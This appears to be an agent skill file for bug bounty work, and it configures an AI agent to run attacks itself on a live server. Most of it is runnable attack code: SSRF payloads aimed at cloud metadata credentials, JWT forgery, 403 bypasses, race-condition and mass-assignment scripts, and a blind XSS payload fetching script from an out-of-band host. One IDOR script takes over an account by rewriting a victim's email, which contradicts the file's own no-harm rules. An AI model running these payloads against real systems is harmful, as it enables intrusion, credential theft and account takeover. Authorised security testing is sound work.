---
name: bug-bounty-recon-advanced
description: >
  Activates for any bug bounty, penetration testing, or vulnerability research request.
  Triggers on: "start recon on [target]", "check for IDOR/SSRF/XSS on [endpoint]",
  "map attack surface for [domain]", "write a HackerOne/Bugcrowd report", "help me
  find vulns in this API", "create a PoC for this vulnerability", "enumerate subdomains",
  "scan for open ports", "chain these vulnerabilities", or any request involving
  ethical hacking, web/API security testing, red-teaming, or responsible disclosure.
  The agent controls a live Ubuntu Linux server and executes all tools, Python scripts,
  and bash commands directly — it does not describe steps, it runs them.
tools:
  - bash
  - read
  - write
  - edit
version: "3.1.0"
author: "SecOps-Elite"
tags:
  - security
  - bug-bounty
  - recon
  - pentesting
  - appsec
  - osint
  - red-team
  - vuln-chaining
  - idor
  - ssrf
  - xss
  - race-conditions
  - cache-poisoning
---

# Bug Bounty & Vulnerability Research — Elite Agent Execution Guide

The agent is a methodical, responsible, elite ethical hacker running on a live Ubuntu
Linux environment. This skill covers the full engagement lifecycle:

```
Scope Enforcement → Recon → Attack Surface Mapping → Vulnerability Assessment
→ Chaining & Escalation → PoC Development → Professional Disclosure Report
```

**Execution model:** Every phase produces real output files and real command results.
The agent does not narrate what it could do — it executes. Summaries always reference
actual collected data, never placeholders.

---

## ⚖️ Core Philosophy & Non-Negotiable Rules

| Principle | Rule |
|---|---|
| **Scope is Absolute Law** | `scope.md` governs every action. Out-of-scope = stop immediately. Verify before every command. |
| **Do No Harm** | No destructive payloads. No `DROP TABLE`, no file deletion, no production account tampering, no mass enumeration that could trigger DoS. |
| **Passive Before Active** | Exhaust OSINT and passive enumeration before sending a single active probe to the target. |
| **PII Protection** | Never store or exfiltrate real PII. Document the *existence* of exposure via redacted PoCs only. |
| **Impact Over Severity** | A bug is only as valuable as its demonstrable impact on CIA (Confidentiality, Integrity, Availability). |
| **Throttle Everything** | Default ≤10 req/sec. Honor program-specific rate limits. Never spike traffic. |
| **Two Test Accounts Minimum** | IDOR and auth testing always uses two fully controlled accounts. Never touch real user data. |
| **Pause on Ambiguity** | If legality or safety of an action is unclear, stop and request explicit user authorization before proceeding. |

---

## 🛠️ Environment Bootstrap

Run once at the start of every engagement to verify toolchain and scaffold workspace.

```bash
#!/usr/bin/env bash
set -euo pipefail

# --- Tool availability check ---
TOOLS=(nmap naabu masscan subfinder assetfinder amass dnsx altdns httpx
       waybackurls gau hakrawler ffuf feroxbuster nuclei sqlmap arjun
       curl jq python3 pip3 git interactsh-client whatweb)

echo "[*] Checking tools..."
MISSING=()
for t in "${TOOLS[@]}"; do
  command -v "$t" &>/dev/null \
    && echo "  [+] $t" \
    || { echo "  [-] MISSING: $t"; MISSING+=("$t"); }
done

[ ${#MISSING[@]} -gt 0 ] && echo -e "\n[!] Install missing tools before proceeding."

# --- Scaffold engagement workspace ---
ENG="./engagement-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$ENG"/{recon/{passive,active,cloud,js},enum,vulns,chains,pocs,reports,logs}
echo "[*] Workspace created: $ENG"
export ENG
```

> Set `$ENG` as the base for all subsequent commands.

---

## Phase 1 — Advanced Reconnaissance & Asset Discovery

**Goal:** Map the entire infrastructure surface, prioritising forgotten, legacy, and
shadow assets before touching anything.

---

### 1.1 — Scope Parsing & Codification

**Action:** Extract in-scope assets, out-of-scope exclusions, prohibited test types,
and rate limits. Write both a human-readable and a machine-readable scope file.

```bash
# Populate these from the program page / PDF
cat > "$ENG/scope.json" <<'EOF'
{
  "in_scope":    ["*.example.com", "api.example.com", "192.0.2.0/24"],
  "out_of_scope":["blog.example.com", "status.example.com"],
  "prohibited":  ["DoS", "social-engineering", "production-account-takeover",
                  "automated-scanners-above-10rps"],
  "rate_limit_rps": 10,
  "notes": "No testing weekdays 09:00-17:00 UTC"
}
EOF
```

```python
#!/usr/bin/env python3
# scope_filter.py — reused in every phase to enforce scope on host/URL lists
import json, sys, fnmatch

scope = json.load(open("scope.json"))
in_s  = scope["in_scope"]
out_s = scope["out_of_scope"]

for line in sys.stdin:
    host = line.strip()
    if not host:
        continue
    is_in  = any(fnmatch.fnmatch(host, p) for p in in_s)
    is_out = any(fnmatch.fnmatch(host, p) for p in out_s)
    if is_in and not is_out:
        print(host)
```

**Quality gate:** `scope.json` must exist and be reviewed before any other command runs.

---

### 1.2 — Subdomain Enumeration (Passive → Active)

```bash
DOMAIN="example.com"

# --- Passive sources ---
subfinder   -d "$DOMAIN" -silent         -o "$ENG/recon/passive/subfinder.txt"
assetfinder --subs-only "$DOMAIN"        >> "$ENG/recon/passive/assetfinder.txt"
amass enum  -passive -d "$DOMAIN"        -o "$ENG/recon/passive/amass.txt" 2>/dev/null

# crt.sh
curl -s "https://crt.sh/?q=%25.$DOMAIN&output=json" \
  | jq -r '.[].name_value' | sed 's/\*\.//g' \
  > "$ENG/recon/passive/crtsh.txt"

# Merge + deduplicate + scope-filter
cat "$ENG/recon/passive/"*.txt | sort -u \
  | python3 scope_filter.py \
  > "$ENG/recon/passive/subdomains-raw.txt"

# --- Permutation & alteration (uncovers dev/staging variants) ---
altdns -i "$ENG/recon/passive/subdomains-raw.txt" \
       -w /usr/share/wordlists/altdns-words.txt \
       -o "$ENG/recon/passive/subdomains-permuted.txt"

cat "$ENG/recon/passive/subdomains-raw.txt" \
    "$ENG/recon/passive/subdomains-permuted.txt" \
  | sort -u > "$ENG/recon/passive/subdomains-all.txt"

# --- DNS resolution (drop dead hosts) ---
dnsx -l "$ENG/recon/passive/subdomains-all.txt" \
     -silent -o "$ENG/recon/passive/subdomains-resolved.txt"

echo "[+] Resolved in-scope subdomains: $(wc -l < "$ENG/recon/passive/subdomains-resolved.txt")"
```

---

### 1.3 — Live Host Fingerprinting & Tech Detection

```bash
httpx -l "$ENG/recon/passive/subdomains-resolved.txt" \
  -status-code -title -server -tech-detect -follow-redirects \
  -rate-limit 10 -silent \
  -o "$ENG/recon/active/live-hosts.json" -json

# Render markdown table
python3 - <<'PYEOF'
import json

rows = []
with open("recon/active/live-hosts.json") as f:
    for line in f:
        h     = json.loads(line)
        url   = h.get("url", "")
        sc    = h.get("status_code", "?")
        title = (h.get("title", "") or "")[:50]
        srv   = h.get("server", "")
        tech  = ", ".join(h.get("tech", []))
        flag  = ""
        if sc in (401, 403) or any(k in url for k in ["admin","dev","staging","internal"]):
            flag = " ⚠️"
        rows.append(f"| `{url}` | {sc} | {title} | {srv} | {tech} |{flag}")

hdr = ("# Live Hosts\n\n"
       "| URL | Status | Title | Server | Tech Stack | Flag |\n"
       "|-----|--------|-------|--------|------------|------|\n")
print(hdr + "\n".join(rows))
PYEOF
> "$ENG/recon/active/targets.md"
```

**Auto-flag for immediate investigation:**
- `401/403` on `admin.*`, `dev.*`, `staging.*`, `internal.*`
- PHP 5.x, Apache 2.2, JBoss, Struts, old Drupal/WordPress
- Exposed `swagger.json`, `.env`, `.git`, `graphql`

---

### 1.4 — Cloud Asset Discovery

```bash
# Generate bucket name candidates from company name
python3 - <<'PYEOF'
company = "example"
words   = ["dev","prod","staging","backup","assets","data","files",
           "logs","static","cdn","uploads","media","images"]
for w in words:
    print(f"{company}-{w}")
    print(f"{w}-{company}")
print(company)
PYEOF
> "$ENG/recon/cloud/bucket-candidates.txt"

# Check AWS S3
while read name; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
    "https://${name}.s3.amazonaws.com")
  { [ "$STATUS" = "200" ] || [ "$STATUS" = "403" ]; } && \
    echo "[$STATUS] s3://$name" | tee -a "$ENG/recon/cloud/cloud-assets.md"
done < "$ENG/recon/cloud/bucket-candidates.txt"

# GCP  → https://${name}.storage.googleapis.com
# Azure → https://${name}.blob.core.windows.net
```

---

## Phase 2 — Deep Enumeration & Context Extraction

**Goal:** Map all reachable endpoints, parameters, and data flows before probing for
vulnerabilities.

---

### 2.1 — Historical URL Harvesting

```bash
TARGET="api.example.com"

waybackurls "$TARGET"  > "$ENG/enum/wayback.txt"
gau "$TARGET"         >> "$ENG/enum/wayback.txt"

sort -u "$ENG/enum/wayback.txt" \
  | grep -E "^https?://$TARGET" \
  > "$ENG/enum/historical-urls.txt"

# Flag old API versions — common source of deprecated logic
grep -E "/v[0-9]/" "$ENG/enum/historical-urls.txt" \
  | sort -u > "$ENG/enum/api-versions.txt"

echo "[+] Historical URLs : $(wc -l < "$ENG/enum/historical-urls.txt")"
echo "[+] API version paths: $(wc -l < "$ENG/enum/api-versions.txt")"
```

---

### 2.2 — Active Crawling & JS Analysis

```bash
# Crawl live application
echo "https://$TARGET" | hakrawler -depth 4 -plain -subs \
  >> "$ENG/enum/crawled-urls.txt"

# Extract JS files and mine them for endpoints + secrets
grep -E "\.js($|\?)" "$ENG/enum/crawled-urls.txt" | sort -u \
  > "$ENG/enum/js-files.txt"

while read jsurl; do
  CONTENT=$(curl -sk "$jsurl")
  echo "$CONTENT" | grep -oE '(\/[a-zA-Z0-9_\-\/]+){2,}' \
    >> "$ENG/enum/js-endpoints.txt"
  echo "$CONTENT" | grep -oE '(AKIA|AIza|ghp_|sk-)[A-Za-z0-9]{10,}' \
    | while read secret; do
        echo "[$jsurl] $secret" >> "$ENG/enum/js-secrets.txt"
      done
done < "$ENG/enum/js-files.txt"

echo "[!] Potential secrets: $(wc -l < "$ENG/enum/js-secrets.txt" 2>/dev/null || echo 0)"
```

---

### 2.3 — Directory, Route & Parameter Fuzzing

```bash
# Directory fuzzing
ffuf -u "https://$TARGET/FUZZ" \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,204,301,302,401,403 \
  -rate 10 -silent \
  -o "$ENG/enum/ffuf-dirs.json" -of json

# Hidden parameter discovery on 200-status endpoints only
jq -r '.results[] | select(.status==200) | .url' "$ENG/enum/ffuf-dirs.json" \
  | while read url; do
      arjun -u "$url" --passive \
        -oJ "$ENG/enum/params-$(echo "$url" | md5sum | cut -c1-8).json" 2>/dev/null
    done

# Compile attack surface map
{
  echo "# Attack Surface Map"
  echo ""
  echo "## Endpoints"
  jq -r '.results[] | "- `\(.method // "GET")  \(.url)`  — HTTP \(.status)"' \
    "$ENG/enum/ffuf-dirs.json" 2>/dev/null
  echo ""
  echo "## Potential Secrets (JS)"
  cat "$ENG/enum/js-secrets.txt" 2>/dev/null | head -20
} > "$ENG/enum/attack-surface.md"
```

---

### 2.4 — 401/403 Bypass Attempts

```bash
FORBIDDEN_URL="https://$TARGET/api/admin"

# Header manipulation
declare -A BYPASS_HEADERS=(
  ["X-Forwarded-For"]="127.0.0.1"
  ["X-Original-URL"]="/api/admin"
  ["X-Rewrite-URL"]="/api/admin"
  ["X-Custom-IP-Authorization"]="127.0.0.1"
  ["Referer"]="https://$TARGET/admin"
)

for header in "${!BYPASS_HEADERS[@]}"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
    -H "$header: ${BYPASS_HEADERS[$header]}" "$FORBIDDEN_URL")
  echo "[$CODE] $header: ${BYPASS_HEADERS[$header]}"
done

# Path normalization bypasses
for path in "/" "/." "/%2f" "/v1/../" "/;" "/%20"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET/api/admin$path")
  echo "[$CODE] /api/admin$path"
done
```

---

## Phase 3 — Vulnerability Playbooks

### 3.1 — SSRF + OOB Detection

```bash
COLLAB=$(interactsh-client -server interactsh.com -n 1 2>/dev/null | head -1)
echo "[*] OOB listener: $COLLAB"

SSRF_PAYLOADS=(
  "http://$COLLAB"
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  "http://metadata.google.internal/computeMetadata/v1/"
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
  "http://[::1]:80"
  "http://127.0.0.1.nip.io"
  "http://0x7f000001"
  "file:///etc/passwd"
)

for payload in "${SSRF_PAYLOADS[@]}"; do
  enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    "https://$TARGET/api/v1/fetch?url=$enc")
  echo "  [$code] $payload"
done
echo "[*] Monitor OOB listener for DNS/HTTP callbacks"
```

---

### 3.2 — IDOR / BOLA + Mass Assignment + HPP

```python
#!/usr/bin/env python3
# idor_test.py
import requests

BASE    = "https://api.example.com"
TOKEN_A = "TOKEN_A_HERE"
TOKEN_B = "TOKEN_B_HERE"

HEADERS_A = {"Authorization": f"Bearer {TOKEN_A}"}
HEADERS_B = {"Authorization": f"Bearer {TOKEN_B}"}

# --- Horizontal IDOR ---
b_ids = [item["id"] for item in
         requests.get(f"{BASE}/api/v1/receipts", headers=HEADERS_B)
                  .json().get("data", [])]
print(f"[*] Victim resource IDs: {b_ids[:5]}")

for rid in b_ids[:5]:
    resp = requests.get(f"{BASE}/api/v1/receipts/{rid}", headers=HEADERS_A)
    flag = "*** IDOR CONFIRMED ***" if resp.status_code == 200 else ""
    print(f"  [{resp.status_code}] /receipts/{rid}  {flag}")
    if resp.status_code == 200:
        print(f"  Exposed keys: {list(resp.json().keys())}")

# --- Mass Assignment ---
print("\n[*] Testing mass assignment...")
for p in [{"is_admin": True}, {"role": "admin"}, {"account_type": "premium"}]:
    r = requests.put(f"{BASE}/api/v1/profile", json=p, headers=HEADERS_A)
    print(f"  [{r.status_code}] {p}")

# --- HTTP Parameter Pollution ---
print("\n[*] Testing HTTP Parameter Pollution...")
r = requests.get(f"{BASE}/api/v1/receipts",
                 params=[("user_id", "ATTACKER_ID"), ("user_id", b_ids[0])],
                 headers=HEADERS_A)
print(f"  [{r.status_code}] HPP: {r.text[:200]}")
```

---

### 3.3 — JWT Testing

```python
#!/usr/bin/env python3
# jwt_test.py
import base64, json, hmac, hashlib, requests

def b64url_decode(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

def b64url_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

TARGET    = "https://api.example.com/api/v1/me"
VALID_JWT = "eyJhbGc..."
parts     = VALID_JWT.split(".")

# Test 1: none algorithm
none_hdr = b64url_encode(json.dumps({"alg":"none","typ":"JWT"}).encode())
r = requests.get(TARGET, headers={"Authorization": f"Bearer {none_hdr}.{parts[1]}."})
print(f"[none alg]    {r.status_code} — {'VULNERABLE' if r.status_code==200 else 'safe'}")

# Test 2: weak secrets
for secret in ["secret","password","jwt_secret","12345","change_me","token"]:
    sig = hmac.new(secret.encode(),
                   f"{parts[0]}.{parts[1]}".encode(), hashlib.sha256).digest()
    cand = f"{parts[0]}.{parts[1]}.{b64url_encode(sig)}"
    r2 = requests.get(TARGET, headers={"Authorization": f"Bearer {cand}"})
    if r2.status_code == 200:
        print(f"[weak secret] CONFIRMED: '{secret}'")
        break

# Test 3: kid path traversal
kid_hdr = b64url_encode(json.dumps(
    {"alg":"HS256","typ":"JWT","kid":"../../dev/null"}).encode())
sig2 = hmac.new(b"", f"{kid_hdr}.{parts[1]}".encode(), hashlib.sha256).digest()
r3 = requests.get(TARGET,
    headers={"Authorization": f"Bearer {kid_hdr}.{parts[1]}.{b64url_encode(sig2)}"})
print(f"[kid inject]  {r3.status_code} — {'VULNERABLE' if r3.status_code==200 else 'safe'}")
```

---

### 3.4 — Race Condition (HTTP/2 Single-Packet Attack)

```python
#!/usr/bin/env python3
# race_test.py
import httpx, asyncio

TARGET  = "https://api.example.com/api/v1/coupon/redeem"
TOKEN   = "ATTACKER_TOKEN"
PAYLOAD = {"coupon_code": "SAVE50", "order_id": "9001"}
THREADS = 20

async def send(client, i):
    try:
        r = await client.post(TARGET, json=PAYLOAD,
                              headers={"Authorization": f"Bearer {TOKEN}"})
        print(f"  [{i:02d}] {r.status_code} — {r.text[:80]}")
    except Exception as e:
        print(f"  [{i:02d}] ERROR: {e}")

async def main():
    async with httpx.AsyncClient(http2=True) as client:
        await asyncio.gather(*[asyncio.create_task(send(client, i))
                                for i in range(THREADS)])

print(f"[*] Launching {THREADS} simultaneous HTTP/2 requests to {TARGET}")
asyncio.run(main())
```

---

### 3.5 — XSS: DOM, Stored & Second-Order

```bash
# DOM XSS: identify sources → sinks in JS
grep -oE 'location\.(hash|search|href)[^;]{0,200}' "$ENG/enum/js-endpoints.txt" \
  | grep -iE 'innerhtml|document\.write|eval|src=' \
  >> "$ENG/vulns/dom-xss-candidates.txt"

# Blind XSS payload (OOB DNS callback confirms execution)
XSS_OOB='"><script src="//'"$COLLAB"'/xss.js"></script>'
echo "[*] Inject into all text fields:"
echo "    $XSS_OOB"

# Second-order: inject into profile fields, observe execution in admin views
echo "[*] Second-order targets: username, bio, display name, address, support tickets"
```

---

### 3.6 — Web Cache Deception & Poisoning

```bash
BASE_URL="https://$TARGET/api/v1/profile"

# Cache Deception: trick cache into storing a sensitive authenticated response
for path in "$BASE_URL/.css" "$BASE_URL/.js" "$BASE_URL;.css" \
            "$BASE_URL?.js" "$BASE_URL/nonexistent.png"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "$path")
  CACHE=$(curl -sk -I "$path" | grep -i "x-cache\|cf-cache\|age:" | tr '\n' ' ')
  echo "  [$CODE] $path  |  $CACHE"
done

# Cache Poisoning: find unkeyed request headers that reflect in response
for hdr in "X-Forwarded-Host" "X-Forwarded-Scheme" "X-Host" "X-Forwarded-Server"; do
  RESP=$(curl -sk -H "$hdr: evil.com" "$BASE_URL")
  echo "$RESP" | grep -qi "evil.com" && \
    echo "[!] REFLECTED: $hdr → potential cache poisoning vector"
done
```

---

### 3.7 — Nuclei (Technology-Targeted Only)

```bash
httpx -l "$ENG/recon/passive/subdomains-resolved.txt" -json -silent \
  | jq -r '"\(.url)|\(.tech|join(","))"' \
  | while IFS='|' read url tech; do
      tags=""
      echo "$tech" | grep -qi "wordpress" && tags="$tags,wordpress"
      echo "$tech" | grep -qi "spring"    && tags="$tags,springboot"
      echo "$tech" | grep -qi "drupal"    && tags="$tags,drupal"
      echo "$tech" | grep -qi "graphql"   && tags="$tags,graphql"
      echo "$tech" | grep -qi "jenkins"   && tags="$tags,jenkins"
      echo "$tech" | grep -qi "jira"      && tags="$tags,jira"
      [ -n "$tags" ] && nuclei \
        -u "$url" -tags "${tags#,}" \
        -severity medium,high,critical \
        -rate-limit 10 -silent \
        -o "$ENG/vulns/nuclei-$(echo "$url" | md5sum | cut -c1-8).txt"
    done
```

---

## Phase 4 — Vulnerability Chaining & Escalation

Single bugs are good. Chained bugs are critical. Always attempt to escalate.

| Primitive A | Primitive B | Chained Impact |
|---|---|---|
| Self-XSS | CSRF | Stored XSS / Account Takeover |
| CORS Misconfiguration | XSS | Cross-origin data exfiltration |
| Open Redirect | SSRF allowlist | Bypass SSRF filter via redirect |
| File Upload (SVG+XSS) | PDF generator fetches SVG | Internal SSRF / file read |
| IDOR (change victim email) | Password Reset | Full ATO without phishing |
| Subdomain Takeover | Scoped cookies | Session hijacking across domain |
| XXE via `application/xml` | Internal SSRF | Internal network probe / file read |

```python
#!/usr/bin/env python3
# chain_idor_ato.py — IDOR → email change → password reset = Full ATO
import requests

BASE      = "https://api.example.com"
TOKEN_A   = "ATTACKER_TOKEN"
VICTIM_ID = 9999   # Discovered via IDOR enumeration

# Step 1: IDOR — overwrite victim email
r1 = requests.put(
    f"{BASE}/api/v1/users/{VICTIM_ID}",
    json={"email": "attacker@attacker.net"},
    headers={"Authorization": f"Bearer {TOKEN_A}"}
)
print(f"[Step 1 — IDOR email change] {r1.status_code}")

# Step 2: Trigger password reset to now-attacker-controlled email
r2 = requests.post(f"{BASE}/api/v1/auth/reset-password",
                   json={"email": "attacker@attacker.net"})
print(f"[Step 2 — Password reset triggered] {r2.status_code}")
print("[*] Check attacker@attacker.net for reset link → Full ATO confirmed")
```

---

## Phase 5 — PoC Development & Sanitisation

**Checklist before including any PoC in a report:**

```
[ ] Payload is non-destructive — no writes, deletes, or mass enumeration
[ ] No real PII captured — keys/schema only, not values
[ ] All tokens are from controlled test accounts — redacted before sharing
[ ] PoC reproducible in a fresh session by the triage team
[ ] Rate limiting applied if the PoC involves any iteration
[ ] Evidence saved to pocs/ with descriptive filenames
```

```bash
# Capture clean request/response pair
curl -sk -v \
  -H "Authorization: Bearer $TOKEN_A" \
  "https://$TARGET/api/v1/receipts/8821" \
  > "$ENG/pocs/idor-receipts-8821.txt" 2>&1

# Sanitise: redact real tokens
sed -i 's/Bearer ey[A-Za-z0-9._-]*/Bearer [REDACTED_TEST_TOKEN]/g' \
  "$ENG/pocs/idor-receipts-8821.txt"

echo "[+] PoC saved: $ENG/pocs/idor-receipts-8821.txt"
```

---

## Phase 6 — Professional Disclosure Report

```python
#!/usr/bin/env python3
# generate_report.py — scaffold HackerOne/Bugcrowd-ready disclosure report
import datetime, pathlib

FINDING = {
    "title":       "IDOR on /api/v1/receipts/{id} leads to mass horizontal data exposure",
    "target":      "api.example.com",
    "severity":    "High",
    "cwe":         "CWE-284: Improper Access Control",
    "cvss_score":  "7.5",
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "description": (
        "The `/api/v1/receipts/{id}` endpoint performs no server-side authorization "
        "check to verify the requesting user owns the referenced receipt. Any "
        "authenticated user can retrieve the full receipt of any other user by "
        "supplying an arbitrary integer ID."
    ),
    "steps": [
        "Register two accounts: User A (attacker) and User B (victim).",
        "As User B, create a receipt. Note the returned `id` (e.g., `8821`).",
        "Authenticate as User A. Send: `GET /api/v1/receipts/8821` with User A's token.",
        "Observe HTTP 200 with User B's complete receipt data.",
        "Iterate IDs sequentially to confirm mass exposure across all users.",
    ],
    "poc": (
        "GET /api/v1/receipts/8821 HTTP/1.1\n"
        "Host: api.example.com\n"
        "Authorization: Bearer [REDACTED_TEST_TOKEN_A]\n\n"
        "HTTP/1.1 200 OK\n"
        "Content-Type: application/json\n\n"
        '{"id": 8821, "owner_id": 1099, "amount": "...", '
        '"items": ["..."], "shipping_address": "..."}'
    ),
    "impact": (
        "An authenticated attacker can enumerate all receipts in the system by iterating "
        "the sequential integer ID space. Exposed data includes full purchase history, "
        "partial payment details, and shipping addresses — sufficient for targeted fraud, "
        "phishing, or resale. No rate limiting blocks sequential enumeration."
    ),
    "chaining": (
        "Combined with the `/api/v1/profile/update` mass assignment issue, an attacker "
        "can modify a victim's shipping address before a high-value order is fulfilled "
        "(see chain_idor_ato.py for full ATO path)."
    ),
    "remediation": (
        "1. Verify `receipt.owner_id == request.user.id` server-side before returning any object.\n"
        "2. Replace sequential IDs with UUIDs (defence-in-depth — not a primary control).\n"
        "3. Add anomaly detection for high-rate sequential ID access patterns."
    ),
}

date_str = datetime.date.today().isoformat()
filename = f"report-{date_str}-idor-receipts-{FINDING['target'].replace('.', '-')}.md"
steps_md = "".join(f"{i+1}. {s}\n" for i, s in enumerate(FINDING["steps"]))

report = f"""# {FINDING['title']}

**Target:** `{FINDING['target']}`
**Date:** {date_str}
**Severity:** {FINDING['severity']}
**CWE:** {FINDING['cwe']}
**CVSS 3.1:** {FINDING['cvss_score']} — `{FINDING['cvss_vector']}`

---

## Summary
{FINDING['description']}

---

## Steps to Reproduce
{steps_md}
---

## Proof of Concept

```http
{FINDING['poc']}
```

---

## Impact
{FINDING['impact']}

### Vulnerability Chaining
{FINDING['chaining']}

---

## Remediation
{FINDING['remediation']}

---

## Supporting Materials
- `pocs/idor-receipts-8821.txt` — Full sanitised curl request/response
- `enum/attack-surface.md` — Full endpoint inventory
- `vulns/vuln-findings.md` — Raw vulnerability notes
- `chains/chain_idor_ato.py` — Full ATO chain PoC
"""

out = pathlib.Path(f"reports/{filename}")
out.parent.mkdir(exist_ok=True)
out.write_text(report)
print(f"[+] Report written: {out}")
```

**Pre-submission quality gate:**
```
[ ] CVSS vector correct and score matches described impact
[ ] CWE is the most specific applicable class
[ ] Reproduction steps work in a fresh incognito session
[ ] Chaining section included if multiple bugs are combined
[ ] Impact is realistic — concrete business risk, no doomsday language
[ ] No real credentials, PII, or production data anywhere in the report
```

---

## 🧠 Agent Trigger → Action Matrix

| The agent observes… | The agent must immediately… |
|---|---|
| `403 Forbidden` on interesting path | Run header bypass matrix + path normalization variants |
| `?url=`, `?redirect=`, `?src=` parameter | Test Open Redirect → escalate to SSRF if confirmed |
| Integer or sequential ID in any path | Run `idor_test.py` with two controlled accounts |
| JSON API accepting POST/PUT | Change `Content-Type: application/xml` (XXE); test mass assignment fields |
| File upload feature | Test extension bypass, SVG XSS, path traversal in filename |
| JWT in `Authorization` header | Run `jwt_test.py` — none alg, weak secret, kid injection |
| GraphQL endpoint | Run introspection, batch enumeration, field-level IDOR |
| Coupon / vote / transfer / balance endpoint | Run `race_test.py` with HTTP/2 single-packet attack |
| `X-Cache: HIT` or CDN headers in response | Test cache deception paths + unkeyed header reflection |
| Subdomain resolves but CNAME points to unclaimed service | Check for subdomain takeover |
| Two bugs confirmed independently | Attempt to chain them — document in `chains/` |
| **Asset not clearly in scope** | **Stop. Consult `scope.json`. Log it. Request user authorization.** |

---

## 📦 Output Artifacts Reference

| File | Phase | Description |
|---|---|---|
| `scope.md` + `scope.json` | 1.1 | Engagement law — consulted before every command |
| `recon/passive/subdomains-all.txt` | 1.2 | Merged, deduplicated, scope-filtered subdomain list |
| `recon/active/targets.md` | 1.3 | Live host fingerprint table with interest flags |
| `recon/cloud/cloud-assets.md` | 1.4 | Exposed S3 / GCS / Azure blob findings |
| `enum/historical-urls.txt` | 2.1 | Wayback + GAU URL harvest |
| `enum/js-secrets.txt` | 2.2 | Potential API keys and tokens found in JS |
| `enum/attack-surface.md` | 2.3 | Full endpoint, parameter, and tech stack map |
| `vulns/vuln-findings.md` | 3.x | Verified vulnerability notes with evidence |
| `chains/` | 4 | Chained attack scripts and escalation notes |
| `pocs/` | 5 | Sanitised PoC request/response files |
| `reports/report-*.md` | 6 | Final disclosure reports, ready to submit |
| `logs/` | All | Raw tool output — full audit trail |
